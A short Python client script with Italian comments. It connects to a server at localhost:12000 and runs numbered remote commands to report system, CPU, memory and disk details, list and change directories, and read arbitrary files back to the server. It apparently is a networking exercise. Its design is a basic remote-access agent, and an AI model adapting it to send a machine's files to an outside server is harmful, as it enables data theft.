from msilib.schema import Error
from socket import *
import platform
import os
import psutil
from psutil._common import bytes2human
import sys
from functions import *

serverName = 'localhost'
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName,serverPort))
print ("Connessione effettuata\n")
while True:
    comando = clientSocket.recv(1024).decode()
    # Visualizza info sul sistema operativo e sulla macchina
    if comando == "1":
        NetworkName = platform.node()
        macchina = platform.machine()
        piattaforma = platform.platform()
        messaggio = 'OS: ' + piattaforma + '\nNetwork Name: ' + NetworkName + '\nType: ' + macchina
        print ("Estraggo informazioni sul sistema operativo\n")
    #Visualizza i file presenti nella directory corrente
    elif comando == "2":
        ls = os.listdir()
        messaggio = ""
        for x in ls:
            messaggio = messaggio + x + "\n"
        print ("Estraggo informazioni sul file system\n")
    #Cambia directory secondo quanto specificato in path
    elif comando[0] == "3":
        path = comando[2:]
        try:
            if path == "":
                os.chdir(".")
                messaggio = "directory cambiata:\n" + os.getcwd()
            else:
                try:
                    os.chdir (path)
                    messaggio = "directory cambiata:\n" + os.getcwd()
                except NotADirectoryError:
                    messaggio = "Not a Directory\n"
            print ("Cambio working directory\n")
        except FileNotFoundError:
            messaggio = "Directory non trovata"
    #Visualizza il percorso della working directory
    elif comando == "4":
        messaggio = os.getcwd()
        print ("Estraggo il path corrente\n")
    #Visualizza info sul processore
    elif comando == "5":
        messaggio = CPUInfo()
        print ("Estraggo informazioni sulla CPU\n")
    elif comando == "6":
        messaggio = MemoryInfo()
        print ("Estraggo informazioni sulla memoria\n")
    elif comando == "7":
        messaggio = DiskInfo()
        print ("Estraggo informazioni sul disco\n")
    elif comando[0] == "8":
        readFile = comando[1:]
        try:
            messaggio = open(readFile,"r").read()
            print ("Estraggo il file " + readFile + "\n")
        except FileNotFoundError:
            messaggio = "File non trovato\n"
        except Exception:
            messaggio = "Errore nell'apertura del file\n"
    elif comando == "exit":
        print ("Connessione terminata\n")
        break
    clientSocket.send(messaggio.encode())
clientSocket.close()
